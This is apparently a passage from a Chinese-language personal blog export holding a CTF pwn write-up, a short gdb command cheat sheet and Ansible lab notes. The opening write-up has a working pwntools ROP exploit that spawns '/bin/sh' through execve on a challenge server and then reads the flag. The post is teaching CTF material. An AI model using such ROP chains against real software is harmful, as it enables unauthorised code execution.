<code>mov qword ptr [rdi], rdx ; ret</code> æŠŠrdxè¨­ç‚º<code>/bin/sh</code>å¾Œä¸Ÿåˆ°rdiæŒ‡å‘çš„ä½ç½®ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./rop&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.nckuctf.org&quot;</span>,<span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401e9f</span></span><br><span class="line">pop_rax = <span class="number">0x44fd07</span></span><br><span class="line">pop_rsi = <span class="number">0x409f0e</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x485a8b</span> </span><br><span class="line">syscall = <span class="number">0x401c54</span></span><br><span class="line">bss = <span class="number">0x4c5000</span></span><br><span class="line"></span><br><span class="line">mov_rdi_rdx = <span class="number">0x433463</span> <span class="comment">#  mov qword ptr [rdi], rdx ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="number">0x0</span>,</span><br><span class="line">    mov_rdi_rdx,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;/home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to use gdb-WriteUp</title>
      <link href="/2024/08/09/pwn/"/>
      <url>/2024/08/09/pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="How-to-use-gdb"><a href="#How-to-use-gdb" class="headerlink" title="How to use gdb"></a>How to use gdb</h2><blockquote><p>å› ç‚ºæˆ‘å¯«åˆ°sropçš„labæ‰ç™¼ç¾æˆ‘ä¸æœƒç”¨gdbï¼Œæ‰€ä»¥é€™é‚Šè¶•å¿«è£œä¸€ä¸‹ğŸ¤§</p></blockquote><h3 id="open-gdb"><a href="#open-gdb" class="headerlink" title="open gdb"></a>open gdb</h3><ul><li><p>attach <code>&lt;pid&gt;</code></p></li><li><p>pwntools open gdb</p>  <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;+h&#x27;</span>] <span class="comment"># è¦å…ˆé–‹tmux</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r) <span class="comment"># åœ¨æƒ³è¦çš„ä½ç½®é–‹gdb</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li></ul><h3 id="èª¿é©"><a href="#èª¿é©" class="headerlink" title="èª¿é©"></a>èª¿é©</h3><p>gdb <strong>Commands</strong></p><ul><li>r &#x3D; runï¼šé‹è¡Œç¨‹å¼ã€‚å¦‚æœç¨‹å¼å·²ç¶“åœ¨é‹è¡Œï¼Œè¼¸å…¥ r æœƒé‡æ–°å•Ÿå‹•ç¨‹å¼ã€‚</li><li>b &#x3D; breakï¼šè¨­ç½®æ–·é»ï¼Œé€šå¸¸åœ¨èª¿è©¦pwnæ™‚ç”¨ä¾†åœ¨ç‰¹å®šçš„è¨˜æ†¶é«”åœ°å€è™•åœä½ç¨‹å¼ï¼Œä¾‹å¦‚ b 0x400908 æˆ– b *main+&lt;è¡Œè™Ÿ&gt;ã€‚</li><li>c &#x3D; continueï¼šç¹¼çºŒåŸ·è¡Œç¨‹å¼ï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€å€‹æ–·é»ã€‚</li><li>n &#x3D; nextï¼šåŸ·è¡Œä¸‹ä¸€è¡ŒæŒ‡ä»¤ã€‚</li><li>ni &#x3D; nextiï¼šåŸ·è¡Œä¸‹ä¸€æ¢æŒ‡ä»¤ï¼Œé€™æ˜¯çœŸæ­£çš„ä¸‹ä¸€å€‹çµ„è­¯æŒ‡ä»¤ã€‚</li><li>s &#x3D; stepï¼šå–®æ­¥åŸ·è¡Œç¨‹å¼ï¼Œç•¶é€²å…¥åˆ°ä¸åŒçš„å‡½æ•¸æ™‚æœƒåœä¸‹ä¾†ï¼Œä¸€èˆ¬æœƒåœ¨å‘¼å« call ä¹‹å¾Œåœåœ¨è¢«å‘¼å«å‡½æ•¸çš„é–‹å§‹ä½ç½®ã€‚</li><li>d &#x3D; deleteï¼šåˆªé™¤æ–·é»ï¼Œå¾Œé¢å¯ä»¥è·Ÿæ•¸å­—ä¾†æŒ‡å®šåˆªé™¤å“ªå€‹æ–·é»ã€‚å¦‚æœä¸å¸¶åƒæ•¸ï¼Œå‰‡åˆªé™¤å…¨éƒ¨æ–·é»ã€‚</li><li>xï¼šæŸ¥çœ‹è¨˜æ†¶é«”å…§å®¹ã€‚</li><li>xinfo: æŒ‡å®šåœ°å€çš„å€¼åŠå…¶å°æ‡‰çš„å…§å­˜å…§å®¹ã€‚</li></ul><blockquote><p>è£œå®Œç™¼ç¾å¥½æƒ³æ²’ä»€éº¼å¥½è£œçš„ï¼Œå‰©ä¸‹ä¹Ÿæ˜¯é ç¶“é©—ğŸ¤§</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTTU ä¼ºæœå™¨åŸç† WriteUp-2</title>
      <link href="/2024/08/09/server-1/"/>
      <url>/2024/08/09/server-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Ansible"><a href="#Ansible" class="headerlink" title="Ansible"></a>Ansible</h2><h3 id="Docs"><a href="#Docs" class="headerlink" title="Docs"></a>Docs</h3><ul><li><code>$ansible-navigator doc -l</code></li><li><code>ansible-navigator doc &lt;ansible.builtin.dnf&gt;</code></li></ul><p><a class="link"   href="https://docs.ansible.com/" >Official <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/By-XF2wX6.png"                      alt="image.png"                ></p><h3 id="Yaml"><a href="#Yaml" class="headerlink" title="Yaml"></a>Yaml</h3><p><a href="/4KwXbbiGQd2tMdJVML-zxA">Re</a></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/H1MBF2vQT.png"                      alt="image.png"                ></p><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><h4 id="åè©è§£é‡‹"><a href="#åè©è§£é‡‹" class="headerlink" title="åè©è§£é‡‹"></a>åè©è§£é‡‹</h4><ul><li>inventory<ul><li>host</li><li>group</li></ul></li><li>playbook<ul><li>play</li><li>task<ul><li>modules</li></ul></li></ul></li></ul><h4 id="Requirement"><a href="#Requirement" class="headerlink" title="Requirement"></a>Requirement</h4><p>Linux , macos ,unix like host: <strong>need &gt;python3.5</strong></p><h4 id="Inventory"><a href="#Inventory" class="headerlink" title="Inventory"></a>Inventory</h4><ul><li>å®šç¾©æ¸…å–®</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> /etc/ansible</span><br><span class="line"><span class="variable">$vim</span> hosts</span><br></pre></td></tr></table></figure></div><blockquote><p>INI or YAML</p></blockquote><ul><li>ç¾¤çµ„</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.com</span><br><span class="line">serverb.lab.example.com</span><br><span class="line">(server count)&gt;=0</span><br><span class="line">[web_server]</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></div><ul><li>å·¢ç‹€ç¾¤çµ„</li></ul><div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[usa]</span><br><span class="line">washington1.example.<span class="keyword">com</span></span><br><span class="line">washington2.example.<span class="keyword">com</span></span><br><span class="line">[canada]</span><br><span class="line">ontario01.example.<span class="keyword">com</span></span><br><span class="line">ontario02.example.<span class="keyword">com</span></span><br><span class="line">[north-americ<span class="variable">a:children</span>]</span><br><span class="line">canada</span><br><span class="line">usa</span><br></pre></td></tr></table></figure></div><h4 id="ansible-cfg"><a href="#ansible-cfg" class="headerlink" title="ansible.cfg"></a>ansible.cfg</h4><ul><li><code>$vim ansible.cfg</code></li></ul><div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory = ./inventory</span><br><span class="line">remote user = devops</span><br><span class="line">ask_pass = false</span><br><span class="line"># $ssh-keygen</span><br><span class="line"># $ssh-<span class="keyword">copy</span>-id</span><br><span class="line">[privilege_escalation]</span><br><span class="line">become = true</span><br><span class="line">become method = sudo</span><br><span class="line">become_user = root</span><br><span class="line">become_ask_pass = true</span><br></pre></td></tr></table></figure></div><ul><li>Show inventory</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cp</span> /etc/ansible/hosts inventory</span><br><span class="line"><span class="variable">$ansible</span>-navigator inventory -m stdout &lt;--list or --graph&gt;</span><br></pre></td></tr></table></figure></div><h4 id="Playbook-yml"><a href="#Playbook-yml" class="headerlink" title="Playbook.yml"></a>Playbook.yml</h4><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Adduser</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">username</span> <span class="string">is</span> <span class="string">chih</span> </span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">chih</span> </span><br><span class="line">        <span class="attr">uid:</span> <span class="number">8888</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br></pre></td></tr></table></figure></div><h4 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ansible</span>-navigator run -m stdout playbook.yml</span><br></pre></td></tr></table></figure></div><h3 id="Ansible-simple-buildup"><a href="#Ansible-simple-buildup" class="headerlink" title="Ansible simple buildup"></a>Ansible simple buildup</h3><h4 id="Ansible-cfg-Inventory"><a href="#Ansible-cfg-Inventory" class="headerlink" title="Ansible.cfg &amp; Inventory"></a>Ansible.cfg &amp; Inventory</h4><ul><li><code>$vim ansible.cfg</code></li></ul><div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory = ./inventory</span><br><span class="line">remote_user = devops</span><br><span class="line">ask_pass = false</span><br><span class="line"># $ssh-keygen</span><br><span class="line"># $ssh-<span class="keyword">copy</span>-id</span><br><span class="line">[privilege_escalation]</span><br><span class="line">become = true</span><br><span class="line">become_method = sudo</span><br><span class="line">become_user = root</span><br><span class="line">become_ask_pass = false</span><br></pre></td></tr></table></figure></div><ul><li><code>vim inventory</code></li></ul><div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.<span class="keyword">com</span></span><br><span class="line">serverb.lab.example.<span class="keyword">com</span></span><br><span class="line"></span><br><span class="line">[unbound_server]</span><br><span class="line">servverc.lab.example.<span class="keyword">com</span></span><br></pre></td></tr></table></figure></div><ul><li><code>$ansible-navigator inventory --graph -m stdout</code></li><li><code>$ansible-navigator exec --ansible -m ansible.builtin.user -a &#39;name=rcwang&#39; bind_server</code><ul><li>ansibel.builtin.user -a : bliud user</li><li>bind_server : In bind_server</li></ul></li></ul><h4 id="Playbook"><a href="#Playbook" class="headerlink" title="Playbook"></a>Playbook</h4><ul><li><code>$vim newuser.yml</code></li></ul><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">useradd</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">jjli</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">jjli</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span>  <span class="comment"># default</span></span><br><span class="line">        </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">hcyang</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">hcyang</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div><ul><li><code>$vim bind_server.yml</code></li></ul><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># This file is setup by &lt;name&gt; at &lt;time&gt; for setting up &lt;server&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">bind-chroot</span> <span class="string">server</span> <span class="string">setup</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Step1.</span> <span class="string">Installation</span></span><br><span class="line">      <span class="attr">ansible.builtin.package:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">bind-chroot</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">    </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Step2.</span> <span class="string">First</span> <span class="string">Start</span></span><br><span class="line">      <span class="attr">ansible.builtin.service:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">named-chroot</span></span><br><span class="line">        <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></div><h4 id="Other-parameter"><a href="#Other-parameter" class="headerlink" title="Other parameter"></a>Other parameter</h4><ul><li>å¢åŠ è¼¸å‡ºçš„ç´°éƒ¨è³‡è¨Š<ul><li><code>$ansibel-navigator run newuser.yml -m stdout -vvvv</code></li></ul></li></ul><table><thead><tr><th>é¸é …v</th><th>æè¿°</th></tr></thead><tbody><tr><td>-v</td><td>é¡¯ç¤ºä»»å‹™çµæœã€‚</td></tr><tr><td>-vv</td><td>ä»»å‹™çµæœå’Œä»»å‹™é…ç½®éƒ½æœƒé¡¯ç¤º</td></tr><tr><td>-vvv</td><td>åŒ…å«é—œæ–¼èˆ‡å—ç®¡ä¸»æ©Ÿé€£æ¥çš„è³‡è¨Š</td></tr><tr><td>-vvvv</td><td>å¢åŠ äº†é€£æ¥å¤–æ›ç¨‹å¼ç›¸é—œçš„é¡å¤–è©³ç´°ç¨‹åº¦é¸é …ï¼ŒåŒ…æ‹¬å—ç®¡ä¸»æ©Ÿä¸Šç”¨æ–¼åŸ·è¡Œè…³æœ¬çš„ç”¨æˆ¶ï¼Œä»¥åŠæ‰€åŸ·è¡Œçš„è…³æœ¬</td></tr></tbody></table><ul><li><code>$ansible-navigator run newuser.yml -m stdout --syntax-check</code><ul><li>æª¢æŸ¥èªæ³•éŒ¯èª¤ or ç¸®æ’</li></ul></li></ul><h3 id="Variable-Fact"><a href="#Variable-Fact" class="headerlink" title="Variable &amp; Fact"></a>Variable &amp; Fact</h3><h4 id="Playbook-variable"><a href="#Playbook-variable" class="headerlink" title="Playbook variable"></a>Playbook variable</h4><ul><li><code>$vim newuser.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">useradd</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">vars:</span> </span><br><span class="line">    <span class="attr">user1:</span> <span class="string">chiawei</span></span><br><span class="line">    <span class="attr">uid1:</span> <span class="number">5566</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">userlist.yml</span> <span class="comment">#</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;user1&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;user1&#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;uid1&#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span>  <span class="comment"># default</span></span><br><span class="line">        </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user2 &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user2 &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;uid2&#125;&#125;</span>&quot;</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div></li><li><code>$vim userlist.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">user2:</span> <span class="string">fan</span></span><br><span class="line"><span class="attr">uid2:</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure></div></li></ul><h4 id="Host-group-variable"><a href="#Host-group-variable" class="headerlink" title="Host &amp; group variable"></a>Host &amp; group variable</h4><ul><li><code>vim inventory</code></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.com ip4.addr=172.25.250.11 # Host variable</span><br><span class="line">serverb.lab.example.com ip4.addr=172.25.250.12</span><br><span class="line"></span><br><span class="line">[bind_server:vars] # group variable</span><br><span class="line">install_sodtware = bind-chroot</span><br><span class="line">service_name = named-chroot</span><br><span class="line"></span><br><span class="line">[unbound_server]</span><br><span class="line">servverc.lab.example.com</span><br></pre></td></tr></table></figure></div><ul><li><code>$mkdir group_vars host_vars</code></li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mkdir</span> group_vars </span><br><span class="line"><span class="variable">$mkdir</span> host_vars</span><br><span class="line"><span class="variable">$cd</span> group_vars</span><br><span class="line"><span class="variable">$vim</span> bind_server</span><br><span class="line"><span class="variable">$cd</span> ..</span><br><span class="line"><span class="variable">$cd</span> host_vars</span><br><span class="line"><span class="variable">$vim</span> servera.lab.example.com</span><br><span class="line"><span class="variable">$vim</span> serverb.lab.example.com</span><br></pre></td></tr></table></figure></div><ul><li><code>$vim bind_server</code></li></ul><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">install_software = bind-chroot</span><br><span class="line">service_name = named-chroot</span><br></pre></td></tr></table></figure></div><ul><li><code>$vim servera.lab.example.com</code></li></ul><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipv4_addr = 172.25.250.11</span><br></pre></td></tr></table></figure></div><ul><li><code>$vim serverb.lab.example.com</code></li></ul><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipv4_addr = 172.25.250.12</span><br></pre></td></tr></table></figure></div><ul><li><code>$tree</code></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HkTGL0wmT.png"                      alt="image.png"                ></p><h4 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h4><ul><li><p>register èªæ³•å¯ä»¥å–å¾—å‘½ä»¤è¼¸å‡ºï¼Œä¸¦ä¿å­˜åœ¨ä¸€å€‹è‡¨æ™‚è®Šæ•¸ä¸­</p></li><li><p><code>$vim newuser.yml</code></p><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Addusers</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">add</span> <span class="string">different</span> <span class="string">user</span> <span class="string">in</span> <span class="string">different</span> <span class="string">server</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;newuser_name&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">register:</span> <span class="string">useradd_result</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Print</span> <span class="string">results</span></span><br><span class="line">      <span class="attr">ansible.builtin.debugg:</span></span><br><span class="line">        <span class="attr">var:</span> <span class="string">useradd_result</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div></li><li><p><code>$ansible-navigator run newuser.yml -m stdout</code></p></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/S1Eos0wXT.png"                      alt="image.png"                ></p><h4 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h4><h3 id="Task-control"><a href="#Task-control" class="headerlink" title="Task control"></a>Task control</h3><ul><li><code>$vim user_add.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">User</span> <span class="string">Management</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">serverd.lab.example.com</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">user_lists:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hcyang</span> </span><br><span class="line">        <span class="attr">user_id:</span> <span class="number">1236</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">jjli</span> </span><br><span class="line">        <span class="attr">user_id:</span> <span class="number">1235</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span 